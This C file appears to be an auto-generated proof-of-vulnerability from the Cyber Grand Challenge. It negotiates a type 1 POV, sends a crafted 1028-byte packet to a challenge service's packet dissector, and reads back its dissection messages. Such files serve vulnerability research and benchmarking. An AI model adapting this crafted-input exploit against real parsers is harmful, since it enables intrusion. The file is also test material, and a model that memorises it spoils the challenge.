#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x04\xbc\x8e\x10"
         "\x0d\x7c\x57\x99\x81\x85\xf0\x6b\x68\x6f\x58\x79\xb6\x83\x2f\x53"
         "\xae\x01\x00\x00\x41\xec\x3b\xf4\xf1\x7c\x8e\x3a\xc9\x1c\x8b\xfb"
         "\x01\x00\x87\x5b\x08\xc8\xd7\xbd\xe6\xa6\x01\x00\x04\x28\x29\xc9"
         "\xfe\x93\x40\x64\x00\xe6\x76\x87\x01\x13\xd9\x27\x91\x04\xa0\x60"
         "\x64\xee\x06\xf8\x36\xb0\x0e\xa5\xbe\x09\x40\x8e\x2f\x96\xa5\x5d"
         "\xce\xd9\xdd\x8d\x12\x90\x22\xfc\x82\x7e\x1a\x28\x0f\x22\x9f\xc4"
         "\x9d\xa9\x3f\x3a\x0f\x5f\x76\x15\x7b\xd9\x04\x45\xcf\xb8\x4b\x93"
         "\x31\x35\x71\x46\x6e\x67\xa8\x38\xdb\x6d\x46\x9a\x21\x30\x5a\x3f"
         "\xfc\xc6\x41\x40\x82\x71\x4e\xf8\x6d\xdf\xe1\xcc\xf2\xbd\x77\xae"
         "\xe1\x40\xab\x97\x54\x75\xfe\x77\xa3\x66\x25\x20\x47\xd5\xc2\x8c"
         "\x8f\x5a\x80\x17\x97\xcb\x46\x39\x2e\x21\xe5\x98\x43\x62\x2d\x23"
         "\xa4\x4a\x3d\xc4\xf5\x49\xfd\x8d\x02\xba\x1c\x71\x0c\x5d\x01\xb1"
         "\xb7\xf8\x21\x0b\x87\xcb\x1b\xc5\x76\xe2\x14\xe9\x54\xd0\xc1\xf9"
         "\xcd\xc9\x44\x0d\xe7\x96\xfd\xb6\x4a\xa1\x5c\x49\x0d\xbb\x46\x7a"
         "\x43\x5e\xf5\x69\x87\x40\xbd\x30\x24\x41\x53\x47\xad\x76\xcf\xe4"
         "\xab\x14\xf3\x80\x41\xe6\x7e\x4d\x0f\x65\xde\x05\x22\xf2\xa6\x48"
         "\xd1\x50\x6c\xe8\x32\x38\xc2\xce\xc7\xdb\xcf\x71\xc5\x1f\x45\x44"
         "\x30\x71\x0c\x11\x8d\x98\xf7\x50\x27\xac\xe4\x77\x7f\xe2\x07\xd7"
         "\x89\xe2\xcb\xe7\x93\x43\x6f\x43\x8c\xc5\x7f\x7f\x2d\x70\x60\x16"
         "\x01\x00\xc5\x0a\x81\x56\x60\xf8\xcd\x68\x68\x8e\x2e\xc1\x7c\xd5"
         "\xe6\xf7\x9f\xd1\xc0\x6d\xd1\xba\x74\x6b\x30\x25\x63\x3c\x79\x8a"
         "\x04\xfb\x42\xa8\xef\x7c\xdc\xbb\x74\x3b\xd3\x7d\xfd\xc2\x60\x0d"
         "\x86\x10\xdb\xea\x99\x29\x17\x7e\xde\x33\x5f\x4f\x68\xad\xd5\x2c"
         "\x84\xc1\x68\xa3\x4b\x44\xd5\x0f\x4f\xdc\xe1\x10\x38\x0a\xf2\xfe"
         "\xbf\xf9\xb8\xa6\x33\x19\x3a\xff\xc7\xfc\x6c\xb3\x99\xd7\xff\xb0"
         "\x36\xb7\xf4\x0e\xa0\x55\xec\x12\x0c\xe2\x75\x1a\x81\xbb\x9e\x60"
         "\xc9\xa4\x2d\x48\xda\xd8\x5f\xa7\x59\x53\xd4\xb7\x36\x7e\xf5\x61"
         "\x3b\x21\x86\xc1\xd1\xb6\x69\x8f\xac\x49\x72\x91\x84\xab\x7f\xc1"
         "\xd2\x24\xe2\xa1\x93\x6a\x87\xc4\x05\xf0\x3c\xbf\x7f\xc0\xb8\xe7"
         "\x8b\x8e\x57\xba\x23\xf4\xf5\xbd\xcb\x9d\xc0\xbb\xc7\x21\xef\xa9"
         "\x4f\x5f\xa8\xb7\x44\xdd\x33\xb9\xd9\xe8\xa4\x57\xe7\xa3\x74\x40"
         "\xa1\x6b\xbf\x65\x3a\xb5\xd8\x12\xa6\x2d\xf7\x5e\xd7\x19\x13\xac"
         "\xad\x3a\x13\x5e\x1f\xf8\x5b\x26\x5f\x0f\x9e\x06\xee\x0a\x2b\x91"
         "\x04\x08\x9e\x65\xdd\x26\x82\xaa\x67\x71\x06\x14\xa7\xe1\x41\x9c"
         "\xea\x2d\xbe\x61\x4f\xe9\x72\x3d\xf5\xba\xc5\x2c\x4e\x69\x8d\x01"
         "\x2b\x38\xba\x7f\x15\x88\xa6\x4a\x8a\x4b\x63\xce\x87\x81\x5d\xa1"
         "\x60\x0b\x94\x28\x3b\x73\x12\xf3\x96\x24\x31\xb2\x27\xb9\xb0\xdf"
         "\x5d\x34\x8c\x8d\xce\xb7\x13\xea\x0e\x2d\xef\x41\x7f\x4e\x8e\x09"
         "\xb5\x3d\x1a\x6d\xca\xab\xe7\x00\xba\xa4\x19\xf8\x9d\x13\x18\xe1"
         "\xf2\x33\xb3\x95\x3b\x02\x21\xba\x8b\x88\xa4\x5d\x6c\xbf\x1d\xeb"
         "\x5f\x9e\xd7\x2c\x7f\x77\x71\x52\x3b\xaa\xfd\xa7\xb4\x5e\x68\xc3"
         "\x23\xc1\x43\xfd\xde\xd4\x5e\x04\x88\x32\x41\x97\x68\xa1\x8a\x3b"
         "\x97\x16\x0c\xe3\x53\x52\x92\x55\x8f\xe5\xe5\xc5\xf9\x18\x19\x87"
         "\x71\xda\xb5\x8c\x88\x66\xae\x80\xce\x8b\x19\x8f\x6e\x03\x5c\xda"
         "\x69\xe9\x33\xde\x34\xe6\x30\x32\xe4\x80\x72\x70\x78\x4d\x84\xd8"
         "\xf6\x58\x13\xf7\x44\x68\x36\x84\xbb\x6f\x51\xec\x79\x69\xf3\x59"
         "\x92\x8c\x4e\xe5\xfa\xbb\x9d\x79\xa7\x11\x9c\x6a\xed\xf1\x11\x37"
         "\x33\x35\xff\xec\x50\x2f\x6d\x5f\x8a\xa8\x2e\x87\xfa\xee\x4f\x59"
         "\xf7\xab\xb5\x71\x22\xb3\x07\xac\x1d\x53\xbd\x0a\x11\xde\x03\x5f"
         "\x0c\x90\xde\x9e\x9a\xa9\x0a\xb0\x1c\xaf\x62\xa7\x67\xb3\x62\xac"
         "\x82\xb5\x0e\x76\x44\x73\x05\x4a\x49\xb5\x83\x27\xef\xc7\xa7\xbc"
         "\xfe\xf0\x5f\xa7\xec\x25\x9d\x73\x2a\x68\x3d\x8e\x3c\x01\x00\x0b"
         "\x06\xe7\xa2\x68\x0a\x01\x07\xe9\xdc\x70\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===buttTarahumara
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x62\x75\x74\x74\x54\x61\x72\x61\x68\x75\x6d"
         "\x61\x72\x61";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
